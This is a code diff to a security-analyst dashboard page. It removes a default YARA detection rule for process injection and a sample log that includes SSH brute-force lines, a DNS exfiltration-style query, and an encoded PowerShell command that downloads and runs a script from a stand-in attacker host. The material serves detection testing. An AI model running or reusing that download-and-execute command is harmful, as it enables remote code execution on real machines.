@@ -5,27 +5,6 @@ import {
 } from 'lucide-react';
 import { analystAPI } from '../services/api';
 
-const DEFAULT_YARA = `rule Detect_Suspicious_Powershell {
-    meta:
-        description = "Detects obfuscated PowerShell execution with Win32 APIs"
-        author = "SENTINEL Threat Analyst"
-        severity = "HIGH"
-    strings:
-        $s1 = "VirtualAllocEx" ascii wide
-        $s2 = "WriteProcessMemory" ascii wide
-        $s3 = "CreateRemoteThread" ascii wide
-        $enc = "-enc" ascii wide nocase
-    condition:
-        ($enc and 2 of ($s*))
-}`;
-
-const DEFAULT_SAMPLE_LOG = `2026-08-03T11:42:10Z auth-prod-01 sshd[9014]: Failed password for root from 185.220.101.5 port 42100 ssh2
-2026-08-03T11:42:11Z auth-prod-01 sshd[9015]: Failed password for root from 185.220.101.5 port 42102 ssh2
-2026-08-03T11:42:12Z auth-prod-01 sshd[9016]: Failed password for admin from 185.220.101.5 port 42104 ssh2
-2026-08-03T11:42:15Z auth-prod-01 sshd[9019]: Failed password for invalid user oracle from 185.220.101.5 port 42110 ssh2
-2026-08-03T11:48:35Z wkstn-finance-08 EventID:4104 powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYQB0AHQAYQBjAGsAZQByAC0AYwAyAC0AbgBlAHQALgB4AHkAegAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA VirtualAllocEx WriteProcessMemory
-2026-08-03T12:01:04Z srv-file-03 dnsmasq[1022]: query[A] payload-base64-chunk-01.ns1.attacker-c2-net.xyz from 10.0.2.89`;
-
 export default function AnalystPage() {
   const [activeTab, setActiveTab] = useState('triage');
 
@@ -36,24 +15,24 @@ export default function AnalystPage() {
 
   // Tab 2: Threat Hunting State
   const [ruleType, setRuleType] = useState('YARA');
-  const [ruleContent, setRuleContent] = useState(DEFAULT_YARA);
-  const [sampleText, setSampleText] = useState(DEFAULT_SAMPLE_LOG);
+  const [ruleContent, setRuleContent] = useState('');
+  const [sampleText, setSampleText] = useState('');
   const [huntingResult, setHuntingResult] = useState(null);
   const [loadingHunt, setLoadingHunt] = useState(false);
 
   // Tab 3: SIEM Log Parser State
-  const [logContent, setLogContent] = useState(DEFAULT_SAMPLE_LOG);
+  const [logContent, setLogContent] = useState('');
   const [parsedLogResult, setParsedLogResult] = useState(null);
   const [loadingParse, setLoadingParse] = useState(false);
 
   // Tab 4: Attack Surface Scanner State
-  const [targetAsset, setTargetAsset] = useState('auth-prod-01.internal');
+  const [targetAsset, setTargetAsset] = useState('');
   const [scanResult, setScanResult] = useState(null);
   const [loadingScan, setLoadingScan] = useState(false);
 
   // Tab 5: SOAR Playbook State
   const [playbookType, setPlaybookType] = useState('BLOCK_IP');
-  const [playbookTarget, setPlaybookTarget] = useState('185.220.101.5');
+  const [playbookTarget, setPlaybookTarget] = useState('');
   const [playbookResult, setPlaybookResult] = useState(null);
   const [loadingPlaybook, setLoadingPlaybook] = useState(false);
   const [copiedPayload, setCopiedPayload] = useState(false);
@@ -322,6 +301,7 @@ export default function AnalystPage() {
                 rows={12}
                 value={ruleContent}
                 onChange={(e) => setRuleContent(e.target.value)}
+                placeholder="Paste or write your YARA / Sigma detection rule here..."
                 className="w-full bg-slate-950 border border-slate-800 rounded-lg p-3 text-xs text-cyan-300 font-mono focus:outline-none focus:border-cyan-500 resize-none leading-relaxed"
               />
             </div>
@@ -332,6 +312,7 @@ export default function AnalystPage() {
                 rows={4}
                 value={sampleText}
                 onChange={(e) => setSampleText(e.target.value)}
+                placeholder="Paste raw log sample or payload text to evaluate rule matching..."
                 className="w-full bg-slate-950 border border-slate-800 rounded-lg p-3 text-xs text-slate-300 font-mono focus:outline-none focus:border-cyan-500 resize-none"
               />
             </div>
@@ -484,7 +465,7 @@ export default function AnalystPage() {
                 type="text"
                 value={targetAsset}
                 onChange={(e) => setTargetAsset(e.target.value)}
-                placeholder="Enter domain or IP (e.g. auth-prod-01.internal)..."
+                placeholder="Enter target IP or Domain (e.g. 192.168.1.1 or company.com)..."
                 className="flex-1 bg-slate-950 border border-slate-800 rounded-lg px-4 py-2.5 text-xs text-slate-200 font-mono focus:outline-none focus:border-cyan-500"
               />
               <button
@@ -580,7 +561,7 @@ export default function AnalystPage() {
                   type="text"
                   value={playbookTarget}
                   onChange={(e) => setPlaybookTarget(e.target.value)}
-                  placeholder="e.g. 185.220.101.5 or attacker-c2.xyz..."
+                  placeholder="Enter IP, domain, username, or endpoint hostname..."
                   className="w-full bg-slate-950 border border-slate-800 rounded-lg px-3 py-2.5 text-xs text-slate-200 font-mono focus:outline-none focus:border-cyan-500"
                 />
               </div>
